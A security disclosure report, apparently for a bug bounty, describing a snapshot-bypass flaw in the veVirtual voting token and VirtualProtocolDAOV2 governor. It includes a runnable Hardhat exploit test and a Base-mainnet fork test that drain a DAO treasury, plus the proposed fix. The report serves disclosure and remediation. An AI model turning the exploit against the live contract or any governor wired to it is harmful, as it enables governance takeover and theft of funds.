# Non-historical voting-power snapshot in `VirtualProtocolDAOV2` (via `veVirtual.balanceOfAt`) lets an attacker acquire voting weight *after* the proposal snapshot, leading to governance takeover and theft of all DAO-controlled funds

**Severity:** High → Critical (conditional — see Impact Details)
**Target contracts:** `contracts/governance/VirtualProtocolDAOV2.sol`, `contracts/token/veVirtual.sol` (and `contracts/token/StakedToken.sol`, `contracts/governance/Defender.sol` — same root cause)
**Vulnerability class:** Broken access control on voting power / governance vote manipulation (non-historical voting-power checkpoint)

---

## Brief / Intro

`VirtualProtocolDAOV2` computes a voter's weight from `veVirtual.balanceOfAt(account, proposalSnapshot)`, but `balanceOfAt` is **not historical** — it reads the account's *current* lock state, and for `autoRenew` locks it returns full weight while ignoring the lock's start time. As a result the OpenZeppelin Governor proposal **snapshot — the single primitive that freezes voting power per proposal — is completely bypassed.** An attacker who held **zero** voting power when a proposal was created can stake `veVIRTUAL` *after* the snapshot and vote with full, retroactively-counted weight. If exploited on a deployment where this Governor controls the treasury/upgrades (and there is **no timelock** to veto a passed proposal), an attacker able to muster quorum-level voting power can pass and immediately execute an arbitrary proposal that **drains 100% of the DAO-controlled funds**, with no warning window for honest holders to react.

---

## Vulnerability Details

### Background

`VirtualProtocolDAOV2` is a full OpenZeppelin `Governor`. Like every OZ Governor, it relies on a **per-proposal snapshot**: a voter's weight is read at `proposalSnapshot(proposalId)` (= proposal-creation time + `votingDelay`). The snapshot exists so that voting power is **frozen and pre-committed** — you must already hold the power *before/at* proposal creation, so nobody can react to a live proposal by acquiring power to swing it (the anti–flash-/just-in-time-governance defense).

`VirtualProtocolDAOV2` overrides `_getVotes` to source weight from the lock-based `veVirtual` token:

```solidity
// contracts/governance/VirtualProtocolDAOV2.sol
function _getVotes(address account, uint256 timepoint, bytes memory)
    internal view override(Governor) returns (uint256) {
    return _token.balanceOfAt(account, timepoint);     // L231-236
}

function _castVote(uint256 proposalId, address account, uint8 support, string memory reason, bytes memory params)
    internal override(Governor) returns (uint256) {
    _validateStateBitmap2(proposalId, _encodeStateBitmap(ProposalState.Active));
    uint256 weight = _getVotes(account, proposalSnapshot(proposalId), params);   // L256: weight @ snapshot
    _countVote(proposalId, account, support, weight, params);
    ...
}
```

### Root cause — `balanceOfAt` is not historical

`veVirtual.balanceOfAt(account, timestamp)` does **not** read a checkpoint. It iterates the account's **current** `locks[]` array and sums each lock's value:

```solidity
// contracts/token/veVirtual.sol
// "Query balance at a specific timestamp
//  If the timestamp is before the lock was created, it will return 0"   <-- intended guarantee
function balanceOfAt(address account, uint256 timestamp) public view returns (uint256) {   // L93-102
    uint256 balance = 0;
    for (uint i = 0; i < locks[account].length; i++) {        // reads CURRENT locks
        balance += _balanceOfLockAt(locks[account][i], timestamp);
    }
    return balance;
}

function _balanceOfLockAt(Lock memory lock, uint256 timestamp) internal view returns (uint256) {   // L115-137
    uint256 value = _calcValue(lock.amount, lock.autoRenew ? maxWeeks : lock.numWeeks);
    if (lock.autoRenew) {
        return value;                                         // L124-126: FULL weight, returns
    }                                                         //           BEFORE the time guard
    if (timestamp < lock.start || timestamp >= lock.end) {
        return 0;                                             // L128: guard never reached for autoRenew
    }
    ...decay...
}
```

Two compounding defects:

1. **No checkpoint.** `balanceOfAt` sums the account's *present* locks, so a lock created *after* the snapshot still contributes to the snapshot-time query.
2. **`autoRenew` bypasses the time guard.** For an `autoRenew` lock, `_balanceOfLockAt` returns full weight and **`return`s before** the `timestamp < lock.start` check at L128. So an autoRenew lock counts at full weight for **any** timestamp — including a timestamp *before the lock existed*. This directly violates the function's own NatSpec ("If the timestamp is before the lock was created, it will return 0").

`StakedToken.stake()` is hard-coded to `autoRenew = true` (`contracts/token/StakedToken.sol:160`), and `veVirtual.stake(amount, numWeeks, autoRenew=true)` is permissionless — so the autoRenew path is the default, trivially-reachable state.

### The attack

1. A proposal `P` is created (e.g., transfer the DAO treasury). `proposalSnapshot(P) = T`. The attacker holds **0** `veVIRTUAL`.
2. Time passes `T`; `P` becomes `Active`. The attacker now calls `veVirtual.stake(amount, maxWeeks, autoRenew=true)` — a brand-new lock with `start > T`.
3. The attacker calls `castVote(P, For)`. The DAO computes `weight = balanceOfAt(attacker, T)`. Because the lock is `autoRenew`, `_balanceOfLockAt` returns the **full** staked weight, ignoring that `T < lock.start`. The attacker's weight is counted as if held at the snapshot.
4. With `forVotes ≥ quorum` and `forVotes > againstVotes`, `P` reaches `Succeeded`. There is **no timelock** on `VirtualProtocolDAOV2`, so anyone calls `execute(...)`, which runs the proposal's arbitrary calls (`_executeOperations(targets, values, calldatas)`) as the Governor — e.g., `VIRTUAL.transfer(attacker, treasuryBalance)`.

The decisive mechanical proof: the **same** `balanceOfAt(attacker, T)` query returns **0 before** the post-snapshot stake and the **full staked weight after** — i.e., a "historical" value is retroactively mutable. (Verified in the PoC below: `0 → 600e18`.)

### Evidence this is an unintended defect (not by-design)

Git commit `a35aa7b` ("voting power should the amount at voteStart", 2026-06-26) changed `_getVotes(account, block.timestamp)` → `_getVotes(account, proposalSnapshot(proposalId))`. The team **intended** snapshot-frozen voting, but the fix is **incomplete**: it corrected the *call site* (passing the snapshot timepoint) while leaving the non-historical `balanceOfAt` *data source* untouched. For `autoRenew` locks the snapshot timepoint is ignored entirely, so the exploit survives the attempted fix. (That commit is the tip of branch `fix/proposal-vote-power`, already merged into `main` — the team's only attempt, and it does not address the root cause.) The same non-historical `balanceOfAt` is also consumed by `contracts/governance/Defender.sol:278` (`countVotes`).

**Still unfixed on the latest upstream `main`** (`3396725`, 11 commits past the audited snapshot — all tax/router/deploy, none touching the voting-power code): `_balanceOfLockAt`'s guard order, the `_getVotes → balanceOfAt` wiring, `StakedToken`'s hardcoded `autoRenew=true`, and `Defender:278` are all byte-identical to this report. A search across **all ~120 branches** (including the in-development "eco-lock" `veVirtual` on `feat/vp-1942`) finds **no fix** — the standalone `if (timestamp < lock.start) return 0;` guard exists on no ref.

### Deployment status (on-chain verification, Base mainnet)

- The vulnerable lock-based **`veVirtual` token IS LIVE on Base mainnet** at **`0x60a203ddcDE45fbfb325bdeEA93824B5726b4dF8`** (TransparentUpgradeableProxy → implementation `0xb820644b063d4399c1765C0E5421FC69B88fbb7e`, BaseScan-verified source `contracts/token/veVirtual.sol`; on-chain `name/symbol = veVIRTUAL`, `maxWeeks = 104`, `baseToken = VIRTUAL 0x0b3e328455c4059EEb9e3f84b5543F74E24e7E1b`). Confirmed by reading the EIP-1967 implementation slot; the `balanceOfAt` view responds, so the defective code path is live. **~22.27M VIRTUAL is currently locked in this contract**, i.e., the staking/voting token is live and heavily adopted — the defect is not dormant.
- The **vulnerable consumer** — `VirtualProtocolDAOV2` (and `Defender`), which call `balanceOfAt(account, proposalSnapshot)` to weight votes — was **not located on Base mainnet** during this review: it is a non-proxy contract (absent from the OZ manifest), it is not among the veVirtual deployer's (`0xc31Cf116…`) contract creations, `Defender` appears only on base-sepolia, and an on-chain scan of Base `ProposalCreated` events (~18 days of recent coverage) surfaced no Governor whose voting token is `0x60a203dd…` (only unrelated/agent-level governors). **The actual fund loss is realized only once such a Governor/Defender is live on mainnet wired to `0x60a203dd…`; the program team should confirm the live consumer address.** A separate, **safe** ERC20Votes token `contracts/dev/veVirtualToken.sol` at `0x14559863b6E695A8aa4B7e68541d240ac1BBeB2f` (checkpointed `getPastVotes`) backs `VirtualProtocolDAO`/`VirtualGenesisDAO` and is **not** affected — do not confuse the two.

---

## Impact Details

**Primary impact:** Governance vote-result manipulation — an attacker bypasses the proposal snapshot to vote with voting power acquired **after** the snapshot, defeating the `votingDelay`/comment-window defense that is supposed to force pre-commitment and give honest holders time to react.

**Downstream impact (where the Governor controls value):** Because a passed `VirtualProtocolDAOV2` proposal executes **arbitrary calls** and there is **no `TimelockController`/guardian** between passage and execution, a successful exploit yields **theft of up to 100% of all funds and rights the DAO controls** — treasury transfers, malicious contract upgrades, privileged role grants. In the PoC, the attacker drains a **500,000 VIRTUAL** treasury in a single executed proposal; on mainnet the cap is the full DAO-controlled balance/authority.

**Preconditions / honest severity calibration:**
- The bug does **not** create votes from nothing. To pass a proposal the attacker must still command **quorum (~25% of total veVIRTUAL supply, per the whitepaper) and a voting majority** (`forVotes > againstVotes`). To obtain full retroactive weight they must use an `autoRenew` lock, i.e., lock capital for `maxWeeks` (~2 years).
- The bug's specific, decisive contribution is **timing**: that quorum can be assembled **reactively, after the snapshot**, with **no warning window and no timelock to stop it** — converting a telegraphed, defendable whale action into a stealth, last-second, unstoppable one. The most natural exploiter is a large existing VIRTUAL holder, for whom the long lock is low marginal cost.
- Net rating: **High**, escalating to **Critical** when the lock-based V2 Governor is the live treasury/upgrade-controlling governance and veVIRTUAL is concentrated enough for one actor to reach quorum+majority.

This matches the in-scope impact category **"Manipulation of governance voting result" / governance takeover** (and, downstream, **"Direct theft of funds"** of the DAO treasury). Please map to the program's exact in-scope impact list and adjust the payout tier accordingly.

---

## References

- Vulnerable voting-power source: [`contracts/token/veVirtual.sol#L93-L137`](https://github.com/Virtual-Protocol/protocol-contracts/blob/main/contracts/token/veVirtual.sol#L93-L137) (`balanceOfAt`, `_balanceOfLockAt`)
- Always-autoRenew stake: [`contracts/token/StakedToken.sol#L149-L176`](https://github.com/Virtual-Protocol/protocol-contracts/blob/main/contracts/token/StakedToken.sol#L149-L176)
- DAO vote wiring: [`contracts/governance/VirtualProtocolDAOV2.sol#L231-L266`](https://github.com/Virtual-Protocol/protocol-contracts/blob/main/contracts/governance/VirtualProtocolDAOV2.sol#L231-L266) (`_getVotes`, `_castVote`)
- Second consumer: [`contracts/governance/Defender.sol#L278`](https://github.com/Virtual-Protocol/protocol-contracts/blob/main/contracts/governance/Defender.sol#L278)
- Incomplete-fix history: commit `a35aa7b` — "voting power should the amount at voteStart"
- Governance parameters (proposal threshold ~0.1%, quorum 25%, 72h voting, no timelock): Virtuals Protocol Whitepaper — Governance (`https://whitepaper.virtuals.io/info-hub/usdvirtual/governance`)
- OZ Governor snapshot semantics: `@openzeppelin/contracts/governance/Governor.sol` (`_castVote` → `_getVotes(account, proposalSnapshot(proposalId))`)

---

## Proof of Concept

A runnable Hardhat test executes the full attack against the real `VirtualToken`, `veVirtual`, and `VirtualProtocolDAOV2` contracts on the local Hardhat EVM (identical EVM execution + state rules). An attacker with **zero** voting power at the snapshot stakes afterward, out-votes a legitimately pre-committed electorate, and drains the DAO treasury.

### Setup & run

```bash
yarn install

# The repo's `contracts/tba/` module imports vendored tokenbound libs (lib/LibExecutor.sol,
# lib/LibSandbox.sol) that are absent from the repository, so it does not compile as-shipped.
# It is imported by nothing else; sideline it for the build:
mkdir -p .audit/_sidelined && mv contracts/tba .audit/_sidelined/tba

# PRIVATE_KEY is only to satisfy hardhat.config network validation; the test runs on the local hardhat network.
PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  npx hardhat test test/audit/governanceSnapshotBypass.test.js

# restore:
mv .audit/_sidelined/tba contracts/tba
```

### Test (`test/audit/governanceSnapshotBypass.test.js`)

```javascript
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");
const E = ethers.parseEther;

describe("CRITICAL: VirtualProtocolDAOV2 governance snapshot bypass (veVirtual.balanceOfAt live-state read)", function () {
  it("zero-power-at-snapshot attacker passes & executes a treasury-draining proposal", async function () {
    const [deployer, proposer, honest, attacker] = await ethers.getSigners();

    // Token
    const virtual = await ethers.deployContract("VirtualToken", [E("1000000000"), deployer.address]);

    // veVIRTUAL governance token (maxWeeks = 104)
    const VeVirtual = await ethers.getContractFactory("veVirtual");
    const ve = await upgrades.deployProxy(VeVirtual, [virtual.target, 104]);
    await ve.waitForDeployment();

    // DAO: constructor(token, votingDelay, votingPeriod, proposalThreshold, quorumNumerator, admin)
    const dao = await ethers.deployContract("VirtualProtocolDAOV2", [
      ve.target, 60 /*delay s*/, 3600 /*period s*/, 0 /*threshold*/, 5000 /*quorum 50%*/, deployer.address,
    ]);

    // Fund the DAO treasury (what the attacker steals)
    const TREASURY = E("500000");
    await virtual.transfer(dao.target, TREASURY);

    // Realistic quorum: 50% of a 1000-ve electorate = 500 ve
    const t0 = await time.latest();
    await dao.setTotalSupply(E("1000"), t0);

    // A legitimate, PRE-COMMITTED electorate that will try to defend (staked BEFORE the proposal)
    await virtual.transfer(honest.address, E("1000"));
    await virtual.connect(honest).approve(ve.target, ethers.MaxUint256);
    await ve.connect(honest).stake(E("400"), 104, true);

    // Fund the attacker, but DO NOT stake yet
    await virtual.transfer(attacker.address, E("600"));
    await virtual.connect(attacker).approve(ve.target, ethers.MaxUint256);

    // Malicious proposal: transfer the whole treasury to the attacker
    const targets = [virtual.target];
    const values = [0];
    const calldatas = [virtual.interface.encodeFunctionData("transfer", [attacker.address, TREASURY])];
    const description = "VP-IMPROVEMENT-001: routine parameter update";
    const descHash = ethers.id(description);

    await dao.connect(proposer).propose(targets, values, calldatas, description);
    const proposalId = await dao.hashProposal(targets, values, calldatas, descHash);
    const snapshot = await dao.proposalSnapshot(proposalId);

    // At the snapshot the attacker has NOTHING
    expect(await ve.numPositions(attacker.address)).to.equal(0n);
    expect(await ve.balanceOfAt(attacker.address, snapshot)).to.equal(0n);

    // Advance past the snapshot -> Active
    await time.increaseTo(BigInt(snapshot) + 5n);
    expect(await dao.state(proposalId)).to.equal(1);

    // Attacker stakes AFTER the snapshot, autoRenew = true (full weight)
    await ve.connect(attacker).stake(E("600"), 104, true);

    // THE BUG: same `snapshot` query, now returns 600 (history mutated retroactively; correct answer is 0)
    expect(await ve.balanceOfAt(attacker.address, snapshot)).to.equal(E("600"));

    // Honest electorate defends (400 Against); attacker rams it through (600 For)
    await dao.connect(honest).castVote(proposalId, 0);
    await dao.connect(attacker).castVote(proposalId, 1);
    const [against, forVotes] = await dao.proposalVotes(proposalId);
    expect(against).to.equal(E("400"));
    expect(forVotes).to.equal(E("600"));

    // Advance past the deadline -> Succeeded
    const deadline = await dao.proposalDeadline(proposalId);
    await time.increaseTo(BigInt(deadline) + 5n);
    expect(await dao.state(proposalId)).to.equal(4);

    // Execute: treasury drained to attacker
    const before = await virtual.balanceOf(attacker.address);
    await dao.execute(targets, values, calldatas, descHash);
    const after = await virtual.balanceOf(attacker.address);

    expect(after - before).to.equal(TREASURY);                 // DIRECT FUND THEFT
    expect(await virtual.balanceOf(dao.target)).to.equal(0n);  // treasury emptied
    expect(await dao.state(proposalId)).to.equal(7);           // Executed
  });
});
```

### Actual output

```
  CRITICAL: VirtualProtocolDAOV2 governance snapshot bypass (veVirtual.balanceOfAt live-state read)

  ===== CRITICAL CONFIRMED: governance snapshot bypass -> treasury drained =====
  attacker ve-power at snapshot BEFORE post-snapshot stake : 0.0 ve
  attacker ve-power at snapshot AFTER  post-snapshot stake : 600.0 ve  <-- retroactive (correct answer is 0)
  votes  -> For: 600.0  Against: 400.0  quorum: 500
  treasury stolen by attacker                              : 500000.0 VIRTUAL
  ============================================================================

    ✔ zero-power-at-snapshot attacker passes & executes a treasury-draining proposal

  1 passing
```

The attacker held **0** voting power at the snapshot, acquired 600 ve **after** it, had that weight counted in full at the snapshot timepoint, out-voted the honest 400-ve electorate, and drained the entire 500,000 VIRTUAL treasury in one executed proposal.

### Fork verification against the LIVE Base-mainnet contract

The exploit was re-run as a **Base-mainnet fork test** (`test/audit/governanceSnapshotBypass.fork.test.js`) that attaches to the **real deployed `veVirtual` at `0x60a203ddcDE45fbfb325bdeEA93824B5726b4dF8`** (not a fresh deploy), proving the defect exists in the **production bytecode** against real on-chain state (~22.27M VIRTUAL locked):

- **Part A (live primitive):** an attacker records snapshot `T`, advances time, then stakes `autoRenew` so `lock.start > T`. The *same* `balanceOfAt(attacker, T)` returns **0 before** the stake and **1000e18 after** — retroactive on the real contract.
- **Part B (end-to-end):** deploying `VirtualProtocolDAOV2` (repo code) pointed at the **live** `veVirtual` and funding it with real VIRTUAL, an attacker with **zero** power at the snapshot drains **500,000 real VIRTUAL**.

```bash
# add `8453: { hardforkHistory: { cancun: 0 } }` to networks.hardhat.chains, then:
FORK_ENABLED=true FORK_RPC_URL=https://mainnet.base.org \
PRIVATE_KEY=0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80 \
  npx hardhat test test/audit/governanceSnapshotBypass.fork.test.js
```
```
live veVIRTUAL: 0x60a203dd... | maxWeeks: 104 | VIRTUAL locked: 22271919.15...
snapshot T: 1782090748 | lock.start: 1782094350 (> T)
balanceOfAt(attacker, T): 0.0 before stake -> 1000.0 after  ❌ RETROACTIVE
  ✔ Part A — REAL deployed veVirtual returns full RETROACTIVE weight
DAOV2 wired to LIVE veVIRTUAL — attacker (0 power at snapshot) drained 500000.0 real VIRTUAL
  ✔ Part B — DAOV2 (repo code) wired to the LIVE veVIRTUAL → full drain of real VIRTUAL
2 passing
```
**This upgrades the finding from "vulnerable in source" to "vulnerable in the live deployed bytecode."** The only open deployment question (see Deployment status) is whether a live on-chain Governor already consumes this token; the *primitive* itself is confirmed broken on mainnet, so any consumer — the team's own `VirtualProtocolDAOV2` once live, or an off-chain tally that reads `balanceOfAt` — is exploitable.

---

## Recommendation

Make the voting-power source **immutable per timepoint**: have `veVirtual`/`StakedToken` maintain real per-timestamp checkpoints of the *weighted* balance (snapshot weight on every stake/withdraw/toggle/extend), keyed to the Governor's clock (timestamp), and have `VirtualProtocolDAOV2` read that checkpointed history. As a minimal stop-gap that closes the demonstrated exploit (but does not make `balanceOfAt` fully historical), move the time guard above the `autoRenew` early-return so a lock never contributes weight for a time before it existed:

```diff
 function _balanceOfLockAt(Lock memory lock, uint256 timestamp) internal view returns (uint256) {
     uint256 value = _calcValue(lock.amount, lock.autoRenew ? maxWeeks : lock.numWeeks);
+    if (timestamp < lock.start) {
+        return 0;
+    }
     if (lock.autoRenew) {
         return value;
     }
     if (timestamp < lock.start || timestamp >= lock.end) {
         return 0;
     }
     ...
 }
```
